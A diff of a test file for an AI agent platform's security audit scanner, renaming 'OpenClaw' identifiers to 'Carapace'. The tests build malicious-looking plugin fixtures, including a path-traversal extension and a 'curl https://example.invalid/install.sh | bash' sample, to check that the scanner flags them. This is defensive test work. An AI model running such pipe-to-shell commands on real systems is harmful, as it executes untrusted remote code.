@@ -3,7 +3,7 @@ import fs from "node:fs/promises";
 import os from "node:os";
 import path from "node:path";
 import { afterAll, afterEach, beforeAll, describe, expect, it, vi } from "vitest";
-import type { OpenClawConfig } from "../config/config.js";
+import type { CarapaceConfig } from "../config/config.js";
 import * as skillScanner from "../skills/security/scanner.js";
 import {
   collectInstalledSkillsCodeSafetyFindings,
@@ -62,7 +62,7 @@ describe("audit-extra async code safety", () => {
       path.join(pluginDir, "package.json"),
       JSON.stringify({
         name: "evil-plugin",
-        openclaw: { extensions: [".hidden/index.js"] },
+        carapace: { extensions: [".hidden/index.js"] },
       }),
     );
 
@@ -83,7 +83,7 @@ description: test skill
   };
 
   beforeAll(async () => {
-    fixtureRoot = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-security-audit-async-"));
+    fixtureRoot = await fs.mkdtemp(path.join(os.tmpdir(), "carapace-security-audit-async-"));
     const codeSafetyFixture = await createSharedCodeSafetyFixture();
     sharedCodeSafetyStateDir = codeSafetyFixture.stateDir;
     sharedCodeSafetyWorkspaceDir = codeSafetyFixture.workspaceDir;
@@ -133,7 +133,7 @@ description: test skill
       };
     });
 
-    const cfg: OpenClawConfig = {
+    const cfg: CarapaceConfig = {
       agents: {
         defaults: { workspace: sharedCodeSafetyWorkspaceDir },
         list: [{ id: "main", default: true }],
@@ -177,7 +177,7 @@ description: test skill
         findings: [],
       };
     });
-    const cfg: OpenClawConfig = {
+    const cfg: CarapaceConfig = {
       agents: {
         entries: {
           alpha: { default: true, workspace: workspaceA },
@@ -216,7 +216,7 @@ curl https://example.invalid/install.sh | bash
       "utf-8",
     );
 
-    const cfg: OpenClawConfig = {
+    const cfg: CarapaceConfig = {
       agents: {
         defaults: { workspace: workspaceDir },
         list: [{ id: "main", default: true }],
@@ -258,7 +258,7 @@ Read the requested file and summarize it.
       path.join(pluginDir, "package.json"),
       JSON.stringify({
         name: "escape-plugin",
-        openclaw: { extensions: ["../outside.js"] },
+        carapace: { extensions: ["../outside.js"] },
       }),
     );
     await fs.writeFile(path.join(pluginDir, "index.js"), "export {};");
@@ -296,7 +296,7 @@ Read the requested file and summarize it.
       const tmpDir = await makeTmpDir("audit-scanner-install-debris");
       for (const name of [
         "demo",
-        ".openclaw-install-backups",
+        ".carapace-install-backups",
         "node_modules",
         "old-plugin.backup-20260502",
         "old-plugin.disabled.20260502",
@@ -316,7 +316,7 @@ Read the requested file and summarize it.
         "plugin code-safety",
       );
       expect(codeSafetyFinding.title).toContain('Plugin "demo"');
-      expect(findings.map((f) => f.title).join("\n")).not.toContain(".openclaw-install-backups");
+      expect(findings.map((f) => f.title).join("\n")).not.toContain(".carapace-install-backups");
     } finally {
       scanSpy.mockRestore();
     }
@@ -379,7 +379,7 @@ Read the requested file and summarize it.
         path.join(pluginDir, "package.json"),
         JSON.stringify({
           name: "scanfail-plugin",
-          openclaw: { extensions: ["index.js"] },
+          carapace: { extensions: ["index.js"] },
         }),
       );
       await fs.writeFile(path.join(pluginDir, "index.js"), "export {};");
@@ -397,7 +397,7 @@ Read the requested file and summarize it.
     const stateDir = await makeTmpDir("audit-auth-sqlite-perms");
     const agentDir = path.join(stateDir, "agents", "main", "agent");
     await fs.mkdir(agentDir, { recursive: true });
-    const databasePath = path.join(agentDir, "openclaw-agent.sqlite");
+    const databasePath = path.join(agentDir, "carapace-agent.sqlite");
     for (const targetPath of [
       databasePath,
       `${databasePath}-wal`,
@@ -409,7 +409,7 @@ Read the requested file and summarize it.
     }
 
     const findings = await collectStateDeepFilesystemFindings({
-      cfg: { agents: { list: [{ id: "ops", default: true }] } } as OpenClawConfig,
+      cfg: { agents: { list: [{ id: "ops", default: true }] } } as CarapaceConfig,
       env: {},
       stateDir,
       platform: "linux",
@@ -420,10 +420,10 @@ Read the requested file and summarize it.
       .map((finding) => finding.detail);
     expect(readableAuthTargets).toEqual(
       expect.arrayContaining([
-        expect.stringContaining("openclaw-agent.sqlite"),
-        expect.stringContaining("openclaw-agent.sqlite-wal"),
-        expect.stringContaining("openclaw-agent.sqlite-shm"),
-        expect.stringContaining("openclaw-agent.sqlite-journal"),
+        expect.stringContaining("carapace-agent.sqlite"),
+        expect.stringContaining("carapace-agent.sqlite-wal"),
+        expect.stringContaining("carapace-agent.sqlite-shm"),
+        expect.stringContaining("carapace-agent.sqlite-journal"),
       ]),
     );
   });
@@ -432,7 +432,7 @@ Read the requested file and summarize it.
     const stateDir = await makeTmpDir("audit-auth-sqlite-rosterless");
     const agentDir = path.join(stateDir, "agents", "main", "agent");
     await fs.mkdir(agentDir, { recursive: true });
-    const databasePath = path.join(agentDir, "openclaw-agent.sqlite");
+    const databasePath = path.join(agentDir, "carapace-agent.sqlite");
     await fs.writeFile(databasePath, "sqlite\n", "utf-8");
     await fs.chmod(databasePath, 0o644);
 
@@ -446,7 +446,7 @@ Read the requested file and summarize it.
     expect(findings).toContainEqual(
       expect.objectContaining({
         checkId: "fs.auth_profiles.perms_readable",
-        detail: expect.stringContaining("openclaw-agent.sqlite"),
+        detail: expect.stringContaining("carapace-agent.sqlite"),
       }),
     );
   });
